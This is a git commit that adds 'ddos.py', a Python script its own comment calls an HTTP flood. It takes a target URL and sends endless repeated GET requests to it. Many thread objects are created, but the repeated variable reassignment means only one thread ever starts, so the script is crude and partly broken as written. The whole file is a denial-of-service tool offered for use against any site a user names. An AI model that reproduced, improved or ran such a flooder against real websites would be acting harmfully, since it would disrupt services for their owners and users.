b9add7c7c6bf0c788c969b75897673afb39e1a3a
shoukaku07 <132239141+Shoukaku07@users.noreply.github.com>
2023-10-18 11:55:46 +0700

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,84 @@
+#simpel http-flood with spam send threads
+#this use test load thread website
+
+import requests
+import threading
+import sys
+
+def send_request(url):
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            print("Successfly send thread", url)
+    except Exception as e:
+        print("Failed send thread to", url, "error message:", str(e))
+
+if len(sys.argv) != 2:
+    print("Usage: python ddos.py <url>")
+    sys.exit(1)
+
+target_url = sys.argv[1]
+
+def send_packets():
+    while True:
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+        send_request(target_url)
+      
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread = threading.Thread(target=send_packets)
+packet_thread.start()
